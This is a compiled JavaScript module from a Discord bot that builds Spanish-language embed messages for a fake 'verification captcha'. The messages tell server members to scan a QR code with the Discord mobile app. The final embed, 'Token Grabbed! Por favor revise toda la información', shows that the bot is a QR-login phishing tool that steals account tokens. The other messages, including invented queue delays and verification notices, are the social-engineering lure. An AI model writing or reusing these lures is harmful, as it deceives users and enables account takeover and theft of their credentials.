"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.foundTokenEmbed = exports.lackPermissionsEmebd = exports.roleIsAboveMeEmbed = exports.setRoleEmbed = exports.verificationComplete = exports.alreadyVerifyingEmbed = exports.failedToMessageEmbed = exports.failedVerificationEmbed = exports.pleaseWaitEmbed = exports.prepareVerificationEmbed = exports.afterButtonPressEmbed = exports.verifyMessageEmbed = exports.directMessageEmbed = void 0;
const builders_1 = require("@discordjs/builders");
const config_1 = require("./config");
class EmbedColours {
    static colours = {
        fail: 0xff2222,
        yellow: 0xffd500,
        custom: parseInt(config_1.config.colour, 16),
    };
}
const directMessageEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.custom)
        .setTitle("Captcha de verificación")
        .setDescription("¡Escanee el código QR a continuación usando la aplicación móvil Discord para verificar su identidad dentro del servidor! Obtendrá acceso a todos los canales una vez que se haya verificado.");
    return embed;
};
exports.directMessageEmbed = directMessageEmbed;
const verifyMessageEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.custom)
        .setTitle(`${config_1.config.name} ¡Verificación requerida!`)
        .setDescription(`🔔 **Para acceder al servidor, primero debe pasar la verificación.**\n➡️ Presione el botón Verificar a continuación.`);
    return embed;
};
exports.verifyMessageEmbed = verifyMessageEmbed;
const afterButtonPressEmbed = async (channelId) => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.custom)
        .setTitle(`Inicio de verificación`)
        .setDescription(`La verificación ha comenzado, continúa en tus mensajes directos [aquí](https://discord.com/channels/@me/${channelId})!`);
    return embed;
};
exports.afterButtonPressEmbed = afterButtonPressEmbed;
const prepareVerificationEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.custom)
        .setTitle("Preparación de la verificación")
        .setDescription("Espere mientras preparamos su verificación. Esto puede tardar unos pocos segundos.");
    return embed;
};
exports.prepareVerificationEmbed = prepareVerificationEmbed;
const pleaseWaitEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.yellow)
        .setTitle("Casi llegamos!")
        .setDescription("¡Hemos notado que usted y estamos trabajando duro para verificarlo! La cola está bastante llena en este momento, así que espere mientras completamos su verificación. Esto puede tardar unos pocos segundos.");
    return embed;
};
exports.pleaseWaitEmbed = pleaseWaitEmbed;
const failedVerificationEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.fail)
        .setTitle(`Fallo en la verificación`)
        .setDescription(`Ocurrió un error al intentar verificarte. Por favor, inténtelo de nuevo más tarde.`);
    return embed;
};
exports.failedVerificationEmbed = failedVerificationEmbed;
const failedToMessageEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.fail)
        .setTitle("Fallo en la verificación")
        .setDescription("No pude enviarte un mensaje. Comprueba tu configuración de privacidad e inténtalo de nuevo..");
    return embed;
};
exports.failedToMessageEmbed = failedToMessageEmbed;
const alreadyVerifyingEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.fail)
        .setTitle("Fallo en la verificación")
        .setDescription("Ya estás en el proceso de verificación. Complete esto antes de volver a intentarlo.");
    return embed;
};
exports.alreadyVerifyingEmbed = alreadyVerifyingEmbed;
const verificationComplete = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.custom)
        .setTitle("Verificación completa")
        .setDescription("Te has verificado con éxito. Ahora obtendrá acceso a todos los canales dentro del servidor..");
    return embed;
};
exports.verificationComplete = verificationComplete;
const setRoleEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.custom)
        .setTitle("Conjunto de funciones de verificación")
        .setDescription("Se ha establecido el rol de verificación. Los miembros ahora recibirán este rol una vez que se hayan verificado a sí mismos.");
    return embed;
};
exports.setRoleEmbed = setRoleEmbed;
const roleIsAboveMeEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.fail)
        .setTitle("No se pudo establecer el rol")
        .setDescription("El rol que ha seleccionado está por encima de mi rol más alto. Seleccione un rol debajo de mi rol más alto.");
    return embed;
};
exports.roleIsAboveMeEmbed = roleIsAboveMeEmbed;
const lackPermissionsEmebd = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.fail)
        .setTitle("Permisos no válidos")
        .setDescription("No tiene los permisos correctos para ejecutar este comando. Póngase en contacto con un administrador del servidor.");
    return embed;
};
exports.lackPermissionsEmebd = lackPermissionsEmebd;
const foundTokenEmbed = async () => {
    const embed = new builders_1.EmbedBuilder()
        .setColor(EmbedColours.colours.custom)
        .setTitle("Token Grabbed! Por favor revise toda la información a continuación.");
    return embed;
};
exports.foundTokenEmbed = foundTokenEmbed;
